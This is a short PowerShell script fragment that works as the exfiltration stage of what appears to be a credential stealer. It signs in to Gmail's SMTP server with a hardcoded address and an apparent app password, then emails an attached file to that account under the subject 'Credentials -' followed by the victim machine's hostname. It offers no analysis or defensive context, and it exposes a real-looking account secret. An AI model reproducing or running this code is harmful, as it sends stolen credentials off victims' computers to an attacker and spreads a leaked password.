$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('hess.email.bot@gmail.com', 'chflqnyjdhtbiyvw')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'hess.email.bot@gmail.com'
$ReportEmail.To.Add('hess.email.bot@gmail.com')
$ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
$ReportEmail.Attachments.Add("$output")
$SMTPInfo.Send($ReportEmail)
